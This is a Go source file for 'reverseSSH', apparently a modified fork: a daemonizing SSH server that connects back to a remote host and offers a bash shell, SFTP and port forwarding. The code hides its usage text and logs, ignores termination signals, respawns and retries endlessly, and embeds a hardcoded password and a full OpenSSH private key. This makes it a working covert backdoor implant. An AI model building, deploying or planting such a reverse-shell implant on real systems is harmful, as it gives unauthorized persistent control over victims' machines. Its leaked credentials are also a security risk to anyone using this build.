// reverseSSH - a lightweight ssh server with a reverse connection feature
// Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

package main

import (
	"flag"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"os/signal"
	"reverse-ssh/core"
	"reverse-ssh/server"
	"syscall"

	"github.com/gliderlabs/ssh"
)

// The following variables can be set via ldflags
var (
	Version = "1.3.0-dev"

	defaultShell = "/bin/bash"

	localPassword = "k50iwlii415mxjxyj5my5j"
	authorizedKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBsoCZScg1+4o47unUJ52p46R5rb0Doa83rkLiHaeVDn edy"

	LUSER = "rssh"
	LHOST = ""
	LPORT = 7000
	BPORT = 0 //remote bind port

	reversePWD = ""
	reverseKey = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACAbKAmUnINfuKOO7p1CedqeOkea29A6GvN65C4h2nlQ5wAAAJjwtxy78Lcc\nuwAAAAtzc2gtZWQyNTUxOQAAACAbKAmUnINfuKOO7p1CedqeOkea29A6GvN65C4h2nlQ5w\nAAAEBI7ubrJedFo/exWQIjC0qr2XKNLl+JcwKctWEPZXzL5xsoCZScg1+4o47unUJ52p46\nR5rb0Doa83rkLiHaeVDnAAAAE2VkeUBXSU4tVlZPODI0VTJLVksBAg==\n-----END OPENSSH PRIVATE KEY-----\n"

	retryMax   = -1
	foreground = false
	keep       = false
	noDaemon   = false
)

func StripSlice(slice []string, element string) []string {
	for i := 0; i < len(slice); {
		if slice[i] == element && i != len(slice)-1 {
			slice = append(slice[:i], slice[i+1:]...)
		} else if slice[i] == element && i == len(slice)-1 {
			slice = slice[:i]
		} else {
			i++
		}
	}
	return slice
}

func SubProcess(args []string) *exec.Cmd {
	cmd := exec.Command(args[0], args[1:]...)
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err := cmd.Start()
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Error: %s\n", err)
	}
	return cmd
}

func setupParameters() *core.Params {
	flag.Usage = func() {
		os.Exit(1)
	}

	p := core.Params{}
	flag.StringVar(&p.LUSER, "u", LUSER, "")
	flag.StringVar(&p.LHOST, "t", LHOST, "")
	flag.UintVar(&p.LPORT, "p", uint(LPORT), "")
	flag.UintVar(&p.BindPort, "b", uint(BPORT), "")
	flag.BoolVar(&p.Listen, "l", false, "")
	flag.StringVar(&p.Shell, "s", defaultShell, "")
	flag.BoolVar(&p.NoShell, "N", false, "")
	verbose := flag.Bool("v", false, "")
	flag.Parse()
	if p.Listen {
		p.NoShell = !p.NoShell
	}
	for _, v := range flag.Args() {
		fmt.Printf("%s :", v)
	}
	if !*verbose {
		log.SetOutput(io.Discard)
	}
	return &p
}
func main() {
	flag.BoolVar(&foreground, "nd", false, "")
	flag.BoolVar(&noDaemon, "dd", false, "")
	flag.BoolVar(&keep, "k", false, "")
	var p = setupParameters()

	if !foreground && (os.Getenv("rs_fg") != "1") {
		os.Setenv("rs_fg", "1")
		SubProcess(os.Args)
		log.Printf("[*] Daemon running in PID: %d PPID: %d\n", os.Getpid(), os.Getppid())
		os.Exit(0)
	} else if keep {
		for {
			cmd := SubProcess(StripSlice(os.Args, "-k"))
			log.Printf("[*] Forever running in PID: %d PPID: %d\n", os.Getpid(), os.Getppid())
			cmd.Wait()
		}
		os.Exit(0)
	}

	log.Printf("[*] Service running in PID: %d PPID: %d\n", os.Getpid(), os.Getppid())

	forwardHandler := &ssh.ForwardedTCPHandler{}
	sshServer := ssh.Server{
		Handler:                       createSSHSessionHandler(p.Shell),
		PublicKeyHandler:              createPublicKeyHandler(authorizedKey),
		LocalPortForwardingCallback:   createLocalPortForwardingCallback(p.NoShell),
		ReversePortForwardingCallback: createReversePortForwardingCallback(),
		SessionRequestCallback:        createSessionRequestCallback(p.NoShell),
		ChannelHandlers: map[string]ssh.ChannelHandler{
			"direct-tcpip": ssh.DirectTCPIPHandler,
			"session":      ssh.DefaultSessionHandler,
			"rs-info":      server.CreateExtraInfoHandler(),
		},
		RequestHandlers: map[string]ssh.RequestHandler{
			"tcpip-forward":        forwardHandler.HandleSSHRequest,
			"cancel-tcpip-forward": forwardHandler.HandleSSHRequest,
		},
		SubsystemHandlers: map[string]ssh.SubsystemHandler{},
	}
	if !p.Listen {
		sshServer.PasswordHandler = createPasswordHandler(localPassword)
		sshServer.SubsystemHandlers["sftp"] = createSFTPHandler()
	}
	if !noDaemon {
		//创建监听退出chan
		c := make(chan os.Signal, 1)
		//监听指定信号 ctrl+c kill
		signal.Notify(c, syscall.SIGHUP, syscall.SIGINT, syscall.SIGTERM, syscall.SIGQUIT)
		go func() {
			for s := range c {
				switch s {
				case syscall.SIGINT:
					fmt.Println("exit", s)
					os.Exit(0)
				case syscall.SIGHUP:
					fmt.Println("HUP", s)
				case syscall.SIGTERM, syscall.SIGQUIT:
					fmt.Println("TERM", s)
				default:
					fmt.Println("other", s)
				}
			}
		}()
	}

	//run(p, &server)
	if p.Listen {
		server.RunL(p, &sshServer)
	} else {
		RunRThenCheck(p, &sshServer, reversePWD, reverseKey, retryMax)
	}
	// heartbeat check port open or rerun the server
}
